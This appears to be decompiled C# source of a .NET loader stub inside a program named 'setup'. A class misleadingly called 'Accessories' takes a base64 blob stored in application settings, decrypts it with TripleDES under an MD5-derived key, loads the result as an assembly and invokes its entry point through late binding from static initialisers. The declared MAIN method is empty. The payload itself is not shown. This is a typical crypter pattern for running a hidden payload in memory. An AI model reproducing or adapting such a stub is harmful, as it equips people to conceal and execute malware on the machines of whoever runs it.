using System;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;
using setup.My;

namespace setup;

[StandardModule]
internal sealed class Accessories
{
	public static string string_0 = MySettingsProperty.Settings.Setting;

	public static byte[] byte_0 = md5Decrypt(Convert.FromBase64String(string_0), "丽复复复B3B6制美");

	public static object object_0 = AppDomain.CurrentDomain.Load(byte_0).EntryPoint;

	public static MethodBase fix = (MethodBase)NewLateBinding.LateGet(object_0, (Type)null, "invoke", new object[2] { "!@##$#$((()%#%T&^Y*&T^@#!@@$^*()_%%^^&،ــ،‘أإلألإ\u064c[\u064f]\u064b\u0650\u064e\u0650\u064e]{}لآألأإلإإأـ÷‘^إ\u064c[\u064c%\u064c", null }, (string[])null, (Type[])null, (bool[])null);

	[STAThread]
	public static void MAIN()
	{
	}

	public static byte[] md5Decrypt(byte[] bytData, string sKey, CipherMode tMode = CipherMode.ECB, PaddingMode tPadding = PaddingMode.PKCS7)
	{
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] key = mD5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(sKey));
		mD5CryptoServiceProvider.Clear();
		TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
		tripleDESCryptoServiceProvider.Key = key;
		tripleDESCryptoServiceProvider.Mode = tMode;
		tripleDESCryptoServiceProvider.Padding = tPadding;
		byte[] result = tripleDESCryptoServiceProvider.CreateDecryptor().TransformFinalBlock(bytData, 0, bytData.Length);
		tripleDESCryptoServiceProvider.Clear();
		return result;
	}
}
